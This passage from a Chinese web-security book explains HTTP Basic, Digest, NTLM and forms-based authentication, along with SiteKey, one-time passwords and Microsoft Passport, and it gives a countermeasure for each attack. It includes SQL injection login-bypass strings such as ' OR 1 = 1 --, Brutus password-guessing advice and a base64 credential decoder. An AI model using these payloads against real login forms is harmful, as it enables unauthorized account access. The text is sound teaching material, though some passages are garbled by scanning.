NTLM认证代理服务器 集成 Windows 验证(以前称为 NTLM 认证和 Windows NT 挑战/应答认证) 在 HTTP 上使用微软专有的 NT LAN Manager（NTLM）认证算法。它主要工作在微软的 Internet Explorer 浏览器和 IIS web 服务器上，但也在其他一些流行软件，诸如 Mozilla 的 Firefox 浏览器上使用，它们通过对简单和受保护的 GSS-API 协商机制（Simple and Protected GSS-API Negotiation Mechanism, SPNEGO）Internet 标准（RFC 2478）的支持，来协商 Kerberos、NTLM 或操作系统支持的其他认证协议（比如，微软 Windows 上的 SSPI，Linux 上的 GSS-API，Mac OSX 和其他类 UNIX 系统上实现的 SPNEGO）。

许多 Web 安全评估工具不支持 NTLM 或者 SPNEGO。为了访问采用 NTLM 的 Web 应用程序，需要使用辅助工具，比如 Dmitry Rozmanov 的 NTLM 认证代理服务器（APS），它使你可以用标准的 HTTP 分析工具来检查被 NTLM 认证保护的应用。

提示 关于如何执行 APS 的详细内容可以在本书的网站 http://www.webhackingexposed.com 的 “Contents” 栏目下看到。

##### 密码猜测的对抗措施

对付密码猜测的最有效的对抗措施是采用强密码策略，并配合一个强账户锁定策略。在几次不成功的登录尝试后，应用程序应该锁定该账户，从而限制账户暴露在这种类型的攻击之下。但是，要小心拒绝服务攻击，这种攻击针对拥有高度敏感账户锁定策略的应用程序。一个恶意的攻击者会试图锁定系统上所有的账户。许多开发者选择了一个良好的折中方式，即只暂时锁定账户一小段时间，比如10分钟。这会有效地降低密码猜测的速度。如果使用一个强密码策略，账户密码根本不会被猜出。一个有效的足够大的密码空间，应该由多于8位的字符和数字组成，再结合一个强账户策略，就能有效地减轻密码暴力攻击。

注意 大多数 Web 认证机制都没有集成的账户锁定特性——这里你需要实现自己的逻辑。即使是 IIS，它使用的是 Windows 的基础认证账户，也没有将 Windows 账户锁定的门限链接到 HTTP 认证中（例如，被锁定的账户仍然能够成功地使用基础认证）。

同样的，我们已经注意到有一种方法能够挫败脚本小子，就是对基于表单的认证使用定制的响应页面。这样可以阻止他们使用常用的工具来猜测密码。

另一个方法是使用 “全自动区分计算机和人类的图灵测试”（Completely Automated Public Turing Test to Tell Computers and Humans Apart, CAPTCHAs $ ^{TM} $）来对抗自动密码猜测程序（查看本章的下一节可以获得关于 CAPTCHAs 的更多信息）。

最后，了解当你被攻击时的情况总是有意义的。下面是一个简单的例子，是从受到基础认证密码猜测工具攻击的服务器上获得的一个日志片断，该日志是一种简化的 W3C 格

式，你能猜到攻击者使用的是什么工具吗？

#Fields: c-ip cs-username cs-method cs-uri-query sc-status cs(User-Agent)
192.168.234.32 admin HEAD /test/basic - 401 Mozilla/3.0+(Compatible);
Brutus/AET
192.168.234.32 test HEAD /test/basic - 401 Mozilla/3.0+(Compatible);
Brutus/AET
192.168.234.32 root HEAD /test/basic - 401 Mozilla/3.0+(Compatible);
Brutus/AET

注意，在 Windows IIS 上，基础认证错误也会被写到系统事件日志中。这与 Windows 网络登录失败不同，默认情况下，Windows 网络登录失败不会记录到系统事件日志中，而是会以一个不同的事件 ID 写到安全日志中去。图 4-3 显示了在基本密码猜测攻击后的一个典型的事件日志。

 </div>

##### 窃听和重放攻击

任何在网络上传输时展示证书的认证协议，都会潜在地受到窃听攻击（eavesdropping attacks）的威胁。对网络协议分析者来说，也通俗地称之为嗅探攻击（sniffing attacks）。

重放攻击（replay attack）常常建立在窃听的基础之上，攻击者使用捕获的证书伪装成为一个合法的用户。

遗憾的是，一些非常流行的 Web 认证协议的确把证书暴露在通信线路上。在下面的小

节中，我们将会讨论针对两种流行 Web 认证协议的攻击。

基础认证 我们已经了解到 HTTP 基础认证容易受到密码猜测的攻击。现在，我们会讨论该协议的另外一个弱点。为了阐述我们的观点，首先介绍一下关于基础认证的工作原理的背景知识。

基础认证首先是客户在没有任何认证证书的情况下，向 Web 服务器请求一个受保护的资源。服务器将回复一个访问拒绝消息，该消息包含一个 WWW-Authenticate 头，请求基础认证证书。大多数 Web 浏览器都有自动处理该请求的例程，提示用户输入用户名和密码，如图 4-4 所示。注意，这是一个用浏览器实例化的单独操作系统窗口，不是一个 HTML 表单。

 </div>

一旦用户输入了他或者她的密码，浏览器就会重发这些请求，这一次是带有认证证书的。下面给出一个在原始 HTTP 下典型的基础认证交换的形式（为简洁起见，已做了改动）。首先，对一个使用基础认证保护的资源发出初始请求：

GET /test/secure HTTP/1.0

服务器响应一条 HTTP 401 未授权（要求认证）的消息，该消息包含了 WWW-Authenticate: Basic 头:

HTTP/1.1 401 Unauthorized

WWW-Authenticate: Basic realm="luxor"

客户端浏览器中会弹出一个如图 4-4 所示的窗口。用户向这个窗口输入他或她的用户名及密码，单击 “OK” 按钮，就通过 HTTP 将它们发送出去。

GET /test/secure HTTP/1.0

Authorization: Basic dGVzdDp0ZXN0

注意，客户端实际上重发了相同的请求，只是这次带有一个 Authorization 头。如果证

书不正确，服务器会响应另一条 “未授权” 消息，并重定向到资源请求或者资源本身，这取决于服务器的具体实现。

等等，用户名和密码在哪里呢？按照基础认证的规范，认证证书在响应中的Authorization头中发送，不过它们使用了Base 64算法编码，看起来像是被加密或者散列处理过的，从而导致一些人错误地认为这是安全的。事实上，使用任何一个流行的Base 64解码器，都很容易解码Base 64。下面是一个解码Base 64字符串的Perl脚本：

#!/usr/bin/perl
# bd64.pl
# decode from base 64
use MIME::Base64;
print decode_base64($ARGV[0]);

对刚才那个例子中的基础认证的值运行 bd64.pl 解码器：

C:\bd64.pl dGVzdDp0ZXN0
test:test

如你所见，不管 Authorization 头中发送的值多么难以理解，基础认证对窃听攻击是毫无障碍的，这是该协议的最大问题。当使用 HTTPS 时，这个问题有所缓解了。但是，伴随基础认证的客户端风险仍然存在，因为只要没有关闭浏览器，就不会有无操作的超时或注销。

摘要 摘要认证（Digest authentication）用来提供比基础认证更高级别的安全。在 RFC 2617 中有关于它的描述，摘要认证是一种基于挑战-应答模式的认证模型。这是一种常用的技术，用于证明某人知道某个秘密，而不要求他以容易被窃听的明文形式发送该秘密。

摘要认证与基础认证的工作原理很相似，用户先发出一个没有认证证书的请求，Web服务器回复一个带有 WWW-Authenticate 头的响应，指明访问所请求的资源需要证书。但是和基础认证发送以 Base 64 编码的用户名和密码不同，在摘要认证中服务器让客户选一个随机数（称做“nonce”），然后浏览器使用一个单向的加密函数生成一个消息摘要（message digest），该摘要是关于用户名、密码、给定的 nonce 值、HTTP 方法，以及所请求的 URI。消息摘要函数也被称为散列算法，是一种在一个方向上很容易计算，反方向却不可行的加密算法。与基础认证对比，解码基础认证中的 Base 64 是很容易办到的。在服务器口令中，可以指定任意的散列算法。在 RFC 2617 中，描述了以 MD5 散列函数作为默认算法。

为什么要有  $ \text{nonce} $？为什么不直接对用户密码进行散列？虽然在其他的加密协议中它们有不同的适用范围，但在摘要认证中  $ \text{nonce} $ 就类似于其他密码机制中的  $ \text{salt} $。它用来创建更大的密钥空间，使某些人针对常用的密码发起数据库攻击更加困难。设想一个很大的数据库，可以存放字典中所有单词以及所有长度小于 10 个字符串词的全部排列的 MD5 散列

值，攻击者只用计算一次 MD5 散列值，然后就可以在数据库中寻找 MD5 值对应的密码。

once 的使用可以有效地增大密钥空间，导致攻击者在实施数据库攻击时，需要的 MD5 散列值数据库过于庞大，而基本不可能实现攻击。

摘要认证比基础认证有了明显的改进，主要是因为用户的明文密码不在线路上传输，这大大提高了对抗窃听攻击的能力。但是，摘要认证仍然会受到重发攻击的威胁，因为即使没有用户的实际密码，响应中的消息摘要也会允许访问所请求的资源。但是，由于最初对资源的请求包含在消息摘要中，重放攻击只能访问指定的资源（假定摘要认证正确的实现了）。

在 RFC 2617 中列出了其他针对摘要认证的可能攻击。

注意 微软在实现摘要认证时，要求服务器能够访问用户密码的明文版本，以便计算摘要。因此，在 Windows 上实现摘要认证就需要以可逆的加密形式存放用户密码，而不能采用标准的单向 MD4 算法。

对那些喜欢摆弄程序的人来说，这里有一个小的 Perl 脚本，它使用来自 Neil Winton 的 Digest::MD5 Perl 模块生成 MD5 散列：

#!/usr/bin/perl
# md5-encode.pl
# encode using MD5
use Digest::MD5 qw(md5_hex);
print md5_hex($ARGV[0]);

该脚本以十六进制形式输出 MD5 散列, 如果将第 4 行的相应位置参数替换成  $ qw(md5) $ 或者  $ qw(md5\_base64) $, 也可以输出二进制或者 Base 64 形式的值。该脚本提供了一个基本的工具, 用来比较摘要认证字符串与已知的数值（比如破解的值）, 但是除非用户名、nonce、HTTP 方法和请求的 URI 是已知的, 否则不会有任何结果。

Gregory Duchemin 提供了一个破解 MD5 散列算法的有趣工具——MDcrack（链接请参见本章末尾的“参考和进一步阅读”一节）。

NTLM 老板本的 NTLM 算法很容易受到窃听攻击（特别是 LM 算法）。虽然这些版本不是用在基于 HTTP 的认证中的，但是根据微软知识库文章 Q147706，还是让 Windows 系统使用更新的版本比较好。

#### 窃听的对抗措施

使用 128 位的 SSL 加密可以对抗这些窃听攻击，另外我们强烈推荐所有用基础认证以及摘要认证的 Web 站点都使用这种方法。为了防范重放攻击，摘要的 nonce 应该从难以欺骗的信息，诸如客户 IP 地址和时间戳摘要中创建。

#### ☑ 基于表单的认证攻击

与前面我们讨论过的认证机制不同，基于表单的认证（Forms-based authentication）不依赖于基本的 Web 协议（比如 HTTP）所支持的那些特性（比如基础认证或摘要认证）。它是一种高度可定制的认证机制，通常使用一个表单完成。表单中用 HTML 的 FORM 和 INPUT 标记勾画出需要用户输入用户名/密码信息的字段。在通过 HTTP（或 HTTPS）输入数据之后，服务器端对数据进行逻辑验证。如果证书合法，就会给予客户端浏览器某种类型的令牌，以便在随后的请求中使用。因为高可定制性和灵活性，基于表单的认证是因特网上最流行的认证技术。但是，由于它不依赖于标准 Web 协议的任何特性，所以没有一个执行基于表单的认证的标准方法。

下面我们给出一个基于表单认证的简单例子，来说明它的基本原理。这个例子是基于微软 ASP.NET 的 FormsAuthentication 的，它比较简单，但我们会重点讲述表单认证的关键点。下面是这个例子的描述：在 Web 服务器上仅有的一个目录下，有一个文件 default.aspx，需要经表单认证才能读取。为了实现 APS.NET 表单认证，还需要另外两个文件：在该目录（或应用程序根目录）下的 web.config 文件，以及一个获取用户名/密码的登录表单（称为 login.aspx）。web.config 文件说明哪些资源是由表单认证保护的，并且它包含了一个用户名和密码列表，用来验证用户在 login.aspx 中输入的证书。当然，任何用户名/密码信息来源都可以使用——比如，一个 SQL 数据库。这里建议存储密码的散列值而不是密码原文，以减轻密码泄漏的威胁。以下是当有人请求 default.aspx 时所发生的情况：

GET /default.aspx HTTP/1.0

由于 web.config 文件指明了该目录中的所有资源都要求表单认证，所以服务器响应一个 HTTP 302 重定向到登录页面 login.aspx:

HTTP/1.1 302 Found
Location: /login.aspx?ReturnUrl=%2fdefault.aspx

现在客户端显示了 login.aspx 表单，如图 4-5 所示。该表单中包含了一个叫做 “state” 的隐藏字段，以及两个可见字段：一个是用来获取用户名输入的 “txtUser” 字段，另一个是用来获取密码输入的 “txtPassword” 字段。它们都通过 HTML INPUT 标记实现，用户输入他或她的用户名和密码后，单击 “Login” 按钮，会 POST 表单中的数据到服务器。

 </div>

虽然 POST 和 GET 两者都实现同样的功能, 但多数情况下应该使用 POST 而不是 GET 来发送用户名和密码。使用 GET 有很多安全问题, 因为 Web 服务器、因特网浏览器和代理服务器经常缓存并记录在 GET 头中的数据, 因此在登录页面中使用 GET, 会不经意地暴露用户名和密码。

请注意，如果没有使用 SSL，证书是以明文形式在线路上传输的，如下所示。服务器收到证书数据，并将它们与 web.config 中列出的用户名/密码相比较（同样，也可以是任何定制的数据库）。如果证书匹配，那么服务器就返回一个“HTTP 302 Found with a Location”头，重定向客户端到最初所请求的资源（default.aspx），并带有一个包含了认证令牌的 Set-Cookie 头。

HTTP/1.1 302 Found
Location: /Default.aspx
Set-Cookie: AuthCookie=45F68E1F33159A9158etc.; path=/htmlheadtitleObject moved/title/headbody

请注意，这里的 Cookie 是以 3DES 加密的，这可在 ASP.NET 的 web.config 文件中指定。现在客户重新请求最初的资源，default.aspx，不过这次它提供了认证的令牌（那个 Cookie）。

GET /Default.aspx HTTP/1.0

Cookie: AuthCookie=45F68E1F33159A9158etc.

服务器验证该 Cookie 是合法的，然后提供相应的资源并返回 HTTP 200 OK 消息。所有的 301 和 302 重定向都是悄悄发生的，浏览器上看不到任何迹象。最后的结果：用户请求资源时，要求输入用户名/密码，如果他或她输入了正确的证书，就会收到所请求的资源，否则会收到定制的错误页面。有时，应用程序可能会提供一个“退出”按钮，当用户点击它时就会删除这个 Cookie。或者 Cookie 也可以设置成经过一段时间后过期，服务器不再认为其合法（比如无交互的时间限制或最长会话时间限制）。

再次，这个例子使用了特定的端到端技术——ASP.NET 的 FormsAuthentication 来演示表单认证的几个要素。任何其他的类似技术或者技术集在这里都可以用，而且能实现同样的效果。

从这个例子中可以看到，基于表单的认证很明显地受到密码猜测的攻击。我们喜欢使用 Brutus（在本章前面作了介绍）来攻击基于表单的认证，主要是因为它有“修改序列”“识别表单设置”的功能。这项功能只需要你简单地指定一个登录表单的 URL，然后 Brutus 可以自动分析用户名字段、密码字段，以及表单支持的其他任何字段（包含隐藏字段）。图 4-6 显示了 HTML 表单解释器。

 </div>

Brutus 也允许你指定攻击成功时登录表单应该返回什么样的响应。这是很重要的，因为表单认证的高度定制化，经常会看见站点对成功和失败的登录都使用同样的响应页面，这是对抗针对表单认证进行密码猜测的主要方法。通过 Brutus 工具，无论目标站点使用什么样的响应，你都可以定制密码猜测攻击。

如果没有用某种方法对认证通道进行保护，比如采用 HTTPS，基于表单的认证同样也很容易受到窃听和重放的攻击。

基于表单的认证通常会使用会话 Cookie 来暂时存储认证令牌，这样当用户访问一个 Web 站点时，就不需要反复输入信息。和永久 Cookie 不同，会话 Cookie 只存储在内存中，而永久 Cookie 保存在硬盘上并且在整个会话中都保持。有时 Cookie 可以被操纵或者窃取，

如果它没有加密，有可能泄漏不恰当的信息（请注意在我们的例子中，ASP.NET 被配置成用 3DES 来加密 Cookie）。关于攻击 Cookie 的更多信息，请参见第 7 章和第 12 章。

隐藏标记是用来存储用户临时信息的另一种技术（在前一个例子中，我们看到隐藏字段“state”是与认证证书一起传送的）。认证证书本身也可以保存在隐藏标记中，使得它们在用户面前不可见。但是，正如我们看到的那样，隐藏标记在以 POST 形式发给服务器登录前，是可以被攻击者修改的。

绕过 SQL 后端登录表单 在使用 SQL 后端执行基于表单认证的 Web 站点上，可以使用 SQL 注入来绕过认证（关于 SQL 注入技术的更详细的内容，请参见第 8 章）。很多 Web 站点都使用数据库来保存密码，然后使用 SQL 查询数据库以验证认证证书。一个典型的 SQL 语句可以是下面这个样子（该语句由于页面宽度的限制分成了两行）：

SELECT * from AUTHENTICATIONTABLE WHERE Username = 'username input'
AND Password = 'password input'

如果没有进行恰当的输入验证，注入

Username $ ^{1} $ -

到用户名字段中，会将 SQL 语句变为:

SELECT * from AUTHENTICATIONTABLE WHERE Username = 'Username' -- AND Password = 'password input'

SQL 语句最后的虚线说明剩下的 SQL 语句是注释，应该被忽略掉。这条语句等价于:
SELECT * from AUTHENTICATIONTABLE WHERE Username = 'Username'

瞧！密码检查被不知不觉地删除了。

这是一种通用的攻击，不需要基于 Web 站点进行很多的定制，这和很多其他针对基于表单认证的攻击是一样的。我们见过地下黑客组织将这一攻击自动化的工具。

为了提高攻击的级别, SQL 注入还可以在密码字段上进行。假设使用同样的 SQL 语句, 用如下的密码:

DUMMYPASSWORD' OR 1 = 1 --

会变为下面的 SQL 语句（由于页面宽度的限制，该语句分成了两行）：

SELECT * from AUTHENTICATIONTABLE WHERE Username = 'Username' AND Password = 'DUMMYPASSWORD' OR 1 = 1 -- '

SQL 语句末尾增加了“OR 1=1”，使条件的判断结果总为 true，认证就再一次被绕过了。在 2001 年中期，很多 Web 验证包都发现了有类似的问题。Apache mod_auth_mysql，

Oracle, Pgsql 和 Pgsql_sys 构建的 SQL 查询并没有对单引号做检查(该漏洞在德国 Stuttgart 大学的 CERT 报告中有描述，相关链接可以参见本章最后的“参考和进一步阅读”一节。)

#### ☐ 对抗措施

我们之前所讨论的密码猜测、窃听和重放攻击的对抗措施，对基于表单的认证都同样适用。

阻止 SQL 注入的最好方法是进行输入验证（参见第 8 章）。对认证进行输入验证有点棘手。对于用户名字段进行输入验证没什么问题，绝大多数用户名都是以很规范的方式定义的，它们由字母和数字构成，长度通常是 6-10 个字符。但是，强密码策略鼓励使用含有特殊字符的长密码，这使得输入验证困难了很多。对于那些具有潜在性威胁的字符，比如单引号，一种折中的做法是：不能在密码中使用它们。

这里，我们还要发出严正的警告，一定要确保 Web 应用程序使用的所有软件包都是最新的。针对你自己定制的代码所进行的表单绕过攻击是一回事，但当你的免费或商业认证包容易受到类似问题的攻击时，则完全是另一回事了。

#### 4.1.2 更强的 Web 认证

显然，当今在 Web 上广泛使用的基于用户名/密码认证机制存在固有的缺陷，那么代替措施是什么呢？它们也同样的脆弱吗？

密码是只有用户知道的信息，密码也通常是低加密度的证书，这使得密码猜测成为可能。因此，减轻基于密码认证威胁的主要措施是改为执行多种认证，特别是使用高强度的证书。我们会讨论现在市场上使用的一些经典方法和新方法，这些新方法标志着 Web 认证功能的新发展，它们可以更有效地抵抗在线欺骗，比如钓鱼攻击（Phishing）的风险（关于钓鱼攻击的更多信息，请参见第 10 章）。

##### 数字证书

数字证书比我们至今为止讨论过的所有认证方法都要强健一些。证书认证使用公开密钥系统和数字证书来认证用户。证书认证可以和其他基于密码的认证机制一起使用，以提供更强健的安全性。证书的使用被认为是双重认证的一种实现。除了要用到你所知道的一些信息（密码），还必须用你拥有的一些东西（证书）进行认证。证书可以存放在硬件中（也就是智能卡），以提供更高级别的安全——要访问以这种方式保护的站点，就需要拥有硬件令牌和适当的智能卡读卡器。

客户证书提供了更强的安全性，但这也是有代价的。由于为所有的用户获取证书、发布证书和管理证书十分困难，这种认证方法对大型站点来说非常昂贵。但不管怎么样，拥

有敏感数据或有限用户群的站点，比如常见的商务对商务（business-to-business，B2B）应用程序，如果采用这种方法，将会受益匪浅。

如果私有证书受到保护，那么到现在还没有已知的针对基于证书认证的攻击。很多基于证书的系统默认不检查证书吊销列表（certificate revocation lists，CRL），使得失窃的和吊销的证书还是可以被使用。有针对 PKI 框架或授权的明显的攻击（见第 5 章），但这不属于基于证书认证本身的问题。

如第 1 章所述，很多 Web 攻击工具支持基于证书的认证。比如，IE 的扩展 TamperIE，可以轻而易举在浏览器内操纵由 SSL 保护的表单。HTTP 代理工具，比如 Paros Proxy，也支持 SSL。

### PassMark/SiteKey

PassMark Security 公司成立于 2004 年，致力于金融服务市场中的强认证。到 2005 年末，他们宣称有接近 1500 万的用户受到了他们 PassMark 技术的保护。这很大部分是由于 2005 年中期，美洲银行为他们的 1300 万在线银行客户部署了 PassMark 技术。美洲银行将他们的这一举措称为 “Sitekey”。

PassMark/SiteKey 基于双重、“双向”认证。它使用的双重认证包括用户密码和密码认证设备的信息（可以注册多个设备）。为了实现双向认证，PassMark/SiteKey 在登录流程中为用户提供秘密信息，这样用户也可以认证站点。

PassMark/SiteKey 方法是这样工作的：在登录时，使用注册账号时创建的一个特殊设备 ID，对用户的设备进行被动认证，该 ID 提供服务端到客户端的认证。用户输入他们的用户名，并在输入他们的密码前，要求识别一幅图像和对应的短语。这种图像/短语用来提供对站点的简单的、图形化/文本化认证，防范恶意站点冒充或伪装成合法的站点（就像钓鱼）。在输入正确的密码后，用户像平常那样被认证。关于 PassMark/SiteKey 更详细的阐述，请参见本章末尾“参考和进一步阅读”一节中提供的链接。

PassMark/SiteKey 提供了比简单的用户名/密码系统更好的安全性，但是有多好呢？我们在咨询工作中，测试了一些受 PassMark 保护的应用程序，下面是我们的一些发现，也结合了大量来自 Internet 社区的批评。

我们没有发现以前有人断定的 PassMark 易受到中间人攻击（man-in-the-middle，MITM）的问题。PassMark 使用安全 Cookie，只用 SSL 连接发送。除非用户接受失败的 SSL 握手，否则安全 Cookie 是不会被发送的。因此，PassMark 不会比 SSL 本身更易遭受中间人攻击。但是，当美洲银行的 SiteKey 实现不能识别你的认证设备时（因为它还未注册），它会让你回答一个密码提示问题，这很容易受到中间人攻击，因为攻击者可以在用户/Web

站点间转发问题/答案。

另外，PassMark 提供唯一的图像/短句来认证用户，将产生用户名枚举漏洞，因为这使得攻击者能轻而易举地确定一个账户是否合法。像在本章的开始我们对用户名枚举的讨论那样，这通常并不是一个严重的漏洞，因为攻击者还需要猜测账户对应的密码。

一些针对 PassMark 和 SiteKey 广为流传的批评还包括 PassMark 需要额外的设备 ID，妨碍了已有的用户名/密码系统，并且带来了易用性的问题。例如，当用户不得不从不同的设备（其他计算机，kiosks，电话，PDA 等）上进行认证时，要被询问很多“密码提示问题”。

可能针对 PassMark 最严厉的批评，是对始终保密的用户设备 ID 信息（必须被认证机构保存）创建全局信任。。如果一个实现者存在一个设备 ID 信息的安全问题，所有的 PassMark 实现者可能都会丢失他所提供的双重认证的好处。关于 PassMark 和 SiteKey 的更多分析，请查看本章末尾“参考和进一步阅读”一节中提供的链接。

##### 一次性密码（One-time Passwords, OTP）

一次性密码（OTP）已经存在了很多年。你可以从它的名字中猜到，OTP协议包括服务端和客户端预先建立的一组秘密（比如说，一个密码列表），这组秘密每次认证处理只能使用一次。继续用密码列表作为例子，在第一次认证时，客户端提供列表中的第一个密码，然后服务器和客户端双方都从列表中删除该密码，在以后的认证中都不再有效了。OTP背后的基本思想是尽量减少密码本身的敏感性，这样用户不必面对保护密码列表安全如此复杂的事情。关于OTP更多信息，可以在本章末尾的“参考和进一步阅读”中找到链接。

在写本书时，最流行的商业 OTP 实现是 RSA Security 的 SecureID 系统。SecureID 没有在服务端和客户端间共享密码列表，而是实现了一个客户端和服务端之间的同步协议，比如密码（实际上是数字序列或上 PIN 码）只在很小的时间窗口中有效（比如 30 秒）。这种巧妙的 OTP 改进形式提供了更高的安全，因为对攻击者来说密码只在 30 秒窗口（举例来说）内才有价值。每个时间窗口过期后，客户在和服务器同时产生一个新的密码。客户端在一般情况下是一个小型的硬件设备（有时称为 dongle 或 fob），该设备执行 OTP 协议，在每个时间间隔生成新的密码。

时间证明，OTP系统对攻击是具备抵抗力的（至少SecureID就是这样一个有效的抗攻击系统），在小规模、高安全性要求的应用程序中仍很流行，诸如对商业网络的远程访问。而大规模、面向客户配置存在的主要问题仍然是用于客户端设备发布和管理上的成本太高，大约每客户每设备开销到达了100美元。不过公司和客户对这些成本的态度已经开始转变，因为最近在线欺骗的问题越来越多地受到关注，公司已经在开始用OTP来应对客户所担心的这方面的问题。

最明显的证据是，在线金融结构 E*Trade 在 2005 年 3 月宣布为优质客户提供 SecureID

技术服务（其链接请参见本章末尾的“参考和进一步阅读”一节）。E*Trade 称之为“用可选的 Digital Security ID 打造绝对安全的系统”。他们为白金客户免费提供这种服务，也免费提供给在一定时期内维持一定最小余额和交易额的客户（在写这本书时，要求的余额是 50 000 美元，混合账户要求更多；或者每季度至少进行 30 次股票或者其他交易）。但 E*Trade 并没有保证不会为每个另外的或替换的 SecureID 设备收取 25 美元的费用，就是说，在将来他们可能会收取费用或者不再继续提供该服务。

就像任何安全措施一样，OTP 也不是完美的。密码专家 Bruce Schneier 发表了一篇文章，证实钓鱼攻击仍可以绕过 OTP。攻击者建立伪造的站点，该站点只需作为代理与合法站点转发 OTP 交换，或者在用户电脑上安装恶意软件，劫持之前经过认证的会话即可。当然，如果密码重用窗口设置得太宽，就会有重放攻击的威胁。但不管怎么说，OTP 明显地提升了安全性，Schneier 提出的攻击方法对任何认证系统都是通用的，还需要某种程度上对 OTP 单独地描述。E*Trade 能否示范 OTP 的成功，以及他们的示范能否推动 OTP 被市场广泛的接受，让我们拭目以待吧。

#### 4.1.3 Web 认证服务

很多 Web 站点执行官很想把复杂的 Web 安全保护，特别是认证，外包出去。在 20 世纪 90 年代末，市场很快认识到了该现象，微软收购了 Firefly Network，并采用它的技术成为 Internet 的首个认证服务——微软 Passport 供应商，其他站点可以使用微软 Passport 来管理用户身份，同样也可以用于认证。除了公钥基础设施（pseudo-public key infrastructure，PKI）在 Web 上支持 SSL 的全球化使用外，Passport 是唯一大规模实现这种服务的产品，因此在本节中我们用大部分篇幅来讨论它。

注意 Liberty Alliance Project（自由联盟计划）经常作为 Passport 的竞争者被提到，但直到现在，Liberty Alliance Project 都只是致力于开发认证服务标准，还没有一个真正的产品。

#### Microsoft Passport

Passport 是微软公司为因特网开发的通用单点登录（single sign-on，SSO）平台。它允许使用同一套证书去访问任何启用了 Passport 的站点，比如 MSN，Hotmail Messenger。虽然微软曾经鼓励第三方公司使用 Passport 作为通用的认证平台，但他们好像已经放弃了这种商业策略，现在只是把 Passport 集中于支持微软自己的应用。

Passport 的工作原理如下: 某个用户浏览一个 Passport 注册站点, 并创建了一个用户配置文件, 包括用户名和密码。现在用户就被认为是一个 Passport 成员, 并且他或她的证书被存放在 Passport 服务器上。同时, abc.com 决定成为一个 Passport 合作伙伴, 它下载了

Passport SDK，并且与微软签署协议。然后 abc.com 会收到微软通过特快邮件寄来一个加密密钥，并在他们的 Web 服务器上安装，同时安装来自 SDK 的 Passport 管理工具。Passport 的登录服务器会保存一份该加密密钥的副本。

现在，当一个 Passport 成员要查看 abc.com 站点上的受保护内容时，就会被重定向到 Passport 登录服务器上，然后他们必须在一个登录页面输入自己的 Passport 证书，以验证身份。在成功认证后，Passport 的登录服务器在客户端浏览器上设置一个认证 Cookie（也可能设置的是其他的数据，但在这个讨论中我们感兴趣的是认证 Cookie）。该认证 Cookie 包含的数据表示用户已经成功认证了 Passport 服务，这些数据是用 Passport 以及 Passport 合作伙伴共同拥有的密钥加密的。现在，客户被重定向回 abc.com 的服务器，并且这一次提供认证 Cookie。在 abc.com 上的 Passport 管理器用先前安装的共享密钥验证认证 Cookie，并给客户端发送受到安全保护的内容。总的说来，Passport 与基于表单的认证非常相似，主要的不同在于 Passport 不是参考本地的用户名/密码列表而是询问 Passport 服务证书是否合法。

关于 Passport 认证的基本机制有很多变体，在此就不一一列举了。这些变体包括驻留在 Passport 站点上的登录表单，以及向 Passport 进行认证的另一种机制，比如通过到 Hotmail.com 的 Outlook Express 认证。关于这些问题的更多信息，参见本章末尾“参考文件与进一步阅读”中的 Passport 链接。图 4-7 展示了一个基本的 Passport 系统。

 </div>

下面给出了图 4-7 中每一步的相关详细说明。在第 1 步中，客户请求位于合作伙伴站点（在这个例子中是 my.msn.com）上的安全内容：

GET /my.ashx HTTP/1.0
Host: my.msn.com

在第 2 步中，客户被重定向到位于 http://login.passport.com/login.asp 的登录表单。查询字符串在 Location 头中，包含用于识别是哪个合作伙伴站点生成该请求（id=），以及一旦认证成功要返回到哪个 URL（return URL，或 ru=）的信息。同时，WWW-Authenticate 头读取 1.4 版本的 Passport:

HTTP/1.1 302 Object Moved
Location: http://login.passport.com/login.asp?id=6528&ru=http://my.msn.com/etc.
WWW-Authenticate: Passport1.4 id=6528,ru= http://my.msn.com/etc.

在第 3 步中，客户从 login.passport.com 请求登录页面：

GET /login.asp?id=6528&ru=http://my.msn.com/etc. HTTP/1.0
Referer: http://www.msn.com/
Host: login.passport.com

然后用户输入他或她的 Passport 密码到 login.asp，并 POST 该数据。注意，证书是通过 SSL 发送的，但在我们这里以明文的形式出现。SSL 是在执行登录的机器上发起的。Passport 合作伙伴并不强制要求在客户和合作伙伴站点间使用 SSL，这样会将 Passport 令牌暴露在窃听的威胁下。

POST /ppsecure/post.srf?lc=1033&id=6528&ru=http://my.msn.com/etc.HTTP/1.0
Referer: http://login.passport.com/login.asp?id=6528&ru=http://my.msn.com/etc.

Host: loginnet.passport.com

login=johndoe&domain=msn.com&passwd=guessme=&msppp_shared=

在第 4 步中，成功登录后，Passport 登录服务器在客户端设置一系列 Cookie，在这里，重要的 Cookie 是 MSPAuth cookie，它是 Passport 认证的票据。

HTTP/1.1 200 OK
Set-Cookie: MSPAuth=4Z9iuseblah;domain=.passport.com;path=/
Set-Cookie: MSPProf=4Z9iuseblah;domain=.passport.com;path=/etc.

最后，在第 5 步中，客户返回到合作伙伴站点上的最初资源（Passport 登录服务器会从最初请求字符串的 ru 值中记住该资源），这次在手中有 MSPAuth 票据了。

GET /my.ashx HTTP/1.0
Host: my.msn.com

Cookie: MSPAuth=2Z9iuseblah; MSPProf=2Z9iuseblah

像我们先前讨论的那样，既然 Passport 的构架本质上共享密钥，现在合作站点可以解密 Cookie，提取出相关的信息并在客户端浏览器中设置它自己的 Cookie （Passport 不能直接设置认证 Cookie，因为大多数当今浏览器安全特性都不允许在另一个域中设置 Cookie）。

现在客户端给出了正确的认证票据，也就可以访问资源。虽然看上去像绕了几圈，但这一切发生的都非常迅速（其速度取决于 Internet 的连接速度），用户根本察觉不到。

单点登录效果靠维持初始的 Passport Cookie 来实现，这允许客户对新的合作站点重复我们步骤中的第 5 步，透明地认证后来的任何 Passport 站点。就像任何 Cookie 一样，Passport Cookie 可以被保存在内存中，并在浏览器关闭时过期。如果在登录时选择了“保存我的 E-mail 地址和密码”选项，Cookie 会被保存在硬盘上。合作站点也可以为 Cookie 指定超时时间，以限制重放攻击的时间窗口。

如果要退出，用户可以单击 Passport “Sign Out” 图标，就会再一次被重定向到 login.passport.com，然后 Passport 删除 Passport Cookie（设置它们为 NULL），使用户返回到合作站点。

HTTP/1.1 200 OK
Host: login.passport.com
Authentication-Info: Passport1.4 da-status=logout
Set-Cookie: MSPAuth= ; expires=Thu, 30-Oct-1980 16:00:00
GMT;domain=.passport.com;path=/;version=1
Set-Cookie: MSPProf= ; expires=Thu, 30-Oct-1980 16:00:00
GMT;domain=.passport.com;path=/;version=1
etc.

这是一个对 Passport 系统相当简单的概述，它整个的特性设置和操作会复杂得多，但是在我们的描述中，回避了许多复杂的问题，用易懂的术语说明了其基本机制。

